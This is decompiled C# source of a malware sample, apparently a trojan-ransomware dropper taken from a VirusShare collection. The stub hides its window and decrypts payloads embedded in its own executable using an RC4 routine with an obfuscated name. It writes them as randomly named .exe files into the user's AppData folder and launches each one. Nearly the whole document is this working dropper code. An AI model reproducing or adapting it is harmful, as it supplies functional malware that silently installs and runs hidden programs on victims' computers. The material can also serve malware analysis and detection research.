// Decompiled with JetBrains decompiler
// Type: Program.Main
// Assembly: ¼zÜšÁz, Version=2.2.2.2, Culture=neutral, PublicKeyToken=null
// MVID: D2DAE8C8-51BA-4C2F-A0AF-E34B41727B40
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00100-msil\Trojan-Ransom.Win32.PornoBlocker.ejnw-b9078c0d7f22c68e45f19bc5c9de1919f6a07f4cf85ccb8aa391d675e8e687f1.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace Program
{
  public class Main : Form
  {
    private IContainer Components;

    [STAThread]
    public static void Main() => Application.Run((Form) new Program.Main());

    public Main()
    {
      this.Load += new EventHandler(this.Main_Load);
      Application.EnableVisualStyles();
      this.InitializeComponent();
      this.SuspendLayout();
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.ClientSize = new Size(292, 266);
      this.Name = nameof (Main);
      this.Text = nameof (Main);
      this.ResumeLayout(false);
      this.PerformLayout();
    }

    protected override void Dispose(bool Disposing)
    {
      if (Disposing && this.Components != null)
        this.Components.Dispose();
      base.Dispose(Disposing);
    }

    [DebuggerStepThrough]
    private void InitializeComponent()
    {
    }

    private void Main_Load(object sender, EventArgs e)
    {
      this.Visible = false;
      this.ShowInTaskbar = false;
      Program.Main.MyMain.Main();
      Environment.Exit(0);
    }

    public class MyMain
    {
      private static int RandomNumber(int min, int max) => new Random().Next(min, max);

      private static string RandomString(int size, bool lowerCase)
      {
        StringBuilder stringBuilder = new StringBuilder();
        Random random = new Random();
        int num1 = checked (size - 1);
        int num2 = 0;
        while (num2 <= num1)
        {
          char ch = Convert.ToChar(Convert.ToInt32(26.0 * random.NextDouble() + 65.0));
          stringBuilder.Append(ch);
          checked { ++num2; }
        }
        return lowerCase ? stringBuilder.ToString().ToLower() : stringBuilder.ToString();
      }

      private static string GetRandom()
      {
        StringBuilder stringBuilder = new StringBuilder();
        stringBuilder.Append(Program.Main.MyMain.RandomString(4, true));
        stringBuilder.Append(Program.Main.MyMain.RandomNumber(1000, 9999));
        stringBuilder.Append(Program.Main.MyMain.RandomString(2, false));
        return stringBuilder.ToString();
      }

      public static void Main()
      {
        string str1 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
        string Delimiter = "0£dæÈÉ¯r6¯3ÈÉr¤ÑXhàÃ\u0001Ï\u001EÑ¯XhàÃ\u0001";
        int FileNumber = FileSystem.FreeFile();
        FileSystem.FileOpen(FileNumber, Application.ExecutablePath, OpenMode.Binary, OpenAccess.Read, OpenShare.Shared);
        string Expression = Strings.Space(checked ((int) FileSystem.FileLen(Application.ExecutablePath)));
        FileSystem.FileGet(FileNumber, ref Expression);
        FileSystem.FileClose(FileNumber);
        string[] strArray = Strings.Split(Expression, Delimiter);
        string str2 = Program.Main.MyMain.GetRandom().ToString() + ".exe";
        string password = strArray[1];
        int num = checked (Convert.ToInt32(strArray[2]) + 2);
        int index = 3;
        while (index <= num)
        {
          FileSystem.FileOpen(1, str1 + index.ToString() + str2, OpenMode.Binary);
          FileSystem.FilePut(1, Program.Main.rc4.ASDASDADAWDAWDAWDAWDAWDAWDDAWDA(strArray[index], password), -1L, false);
          FileSystem.FileClose(1);
          try
          {
            Process.Start(str1 + index.ToString() + str2);
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
          checked { ++index; }
        }
        ProjectData.EndApp();
      }
    }

    public class rc4
    {
      public static string ASDASDADAWDAWDAWDAWDAWDAWDDAWDA(string message, string password)
      {
        int index1 = 0;
        int index2 = 0;
        StringBuilder stringBuilder = new StringBuilder();
        string empty = string.Empty;
        int[] numArray1 = new int[257];
        int[] numArray2 = new int[257];
        int length = password.Length;
        int location1 = 0;
        while (location1 <= (int) byte.MaxValue)
        {
          char String = password.Substring(location1 % length, 1).ToCharArray()[0];
          numArray2[location1] = Strings.Asc(String);
          numArray1[location1] = location1;
          Math.Max(Interlocked.Increment(ref location1), checked (location1 - 1));
        }
        int index3 = 0;
        int location2 = 0;
        while (location2 <= (int) byte.MaxValue)
        {
          index3 = checked (index3 + numArray1[location2] + numArray2[location2]) % 256;
          int num = numArray1[location2];
          numArray1[location2] = numArray1[index3];
          numArray1[index3] = num;
          Math.Max(Interlocked.Increment(ref location2), checked (location2 - 1));
        }
        location1 = 1;
        while (location1 <= message.Length)
        {
          index1 = checked (index1 + 1) % 256;
          index2 = checked (index2 + numArray1[index1]) % 256;
          int num1 = numArray1[index1];
          numArray1[index1] = numArray1[index2];
          numArray1[index2] = num1;
          int num2 = numArray1[checked (numArray1[index1] + numArray1[index2]) % 256];
          int CharCode = Strings.Asc(message.Substring(checked (location1 - 1), 1).ToCharArray()[0]) ^ num2;
          stringBuilder.Append(Strings.Chr(CharCode));
          Math.Max(Interlocked.Increment(ref location1), checked (location1 - 1));
        }
        string str = stringBuilder.ToString();
        stringBuilder.Length = 0;
        return str;
      }
    }
  }
}
